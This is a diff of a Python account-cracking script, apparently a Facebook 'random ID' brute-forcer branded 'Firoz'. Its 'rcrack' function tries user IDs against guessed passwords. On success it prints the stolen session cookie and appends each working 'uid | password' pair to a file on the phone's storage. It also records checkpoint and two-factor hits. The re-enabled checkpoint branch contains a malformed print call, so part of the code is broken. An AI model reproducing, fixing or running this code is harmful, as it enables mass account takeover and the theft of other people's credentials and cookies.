@@ -311,17 +311,16 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
                 print('\033[1;34m[\033[\033[0;101mFiroz-🥵\033[0m[\033[1;32mOK\033[1;34m]\033[1;32m'+uid+'\033[1;32m • \033[1;32m'+ps+'')
-                print('\r\033[0;101mCOOKIE \033[0m=''\033[1;32m'+coki+'\033[0m''\033[0m')
-				os.system('espeak -a 300 " RANDOM OK ID"')
+                print('\r\033[0;101mCOOKIE \033[0m=''\033[1;32m'+coki+'\033[0m''\033[0m')
                # cek_apk(session,coki)
                 open('/sdcard/Firoz-🥵-OK💚.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid);cek_apk(coki)
                 break
-          #  elif 'checkpoint' in log_cookies:
-              #  coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-          #      cid = coki[24:39]
-               #print('\r\r\33[1;34m Firoz-CP'( uid+' | '+ps+' \n')                
-                open('/sdcard/Firoz-cp💔.txt', 'a').write( uid+' | '+ps+' \n')#
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\r\r\33[1;34m Firoz-CP'( uid+' | '+ps+' \n')
+			#	open('/sdcard/Firoz-cp💔.txt', 'a').write( uid+' | '+ps+' \n')#
                 cps.append(cid)
             elif twf in session.cookies.get_dict().keys():
                 print('\033[1;93m\033[0;34mFiroz-🥵-2F '+uid+' • '+ps+'  \033[0;97m')
